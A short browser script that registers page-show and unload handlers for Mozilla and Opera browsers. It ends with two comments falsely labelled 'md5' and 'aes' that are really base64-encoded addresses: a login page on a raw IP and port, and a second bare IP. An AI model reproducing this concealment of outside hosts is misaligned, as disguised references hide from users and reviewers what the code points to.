if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzEyMC43OS4zMC4xODQ6ODAwOC9pbmRleC5odG1sIy9wYWdlcy9sb2dpbi9pbmRleA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/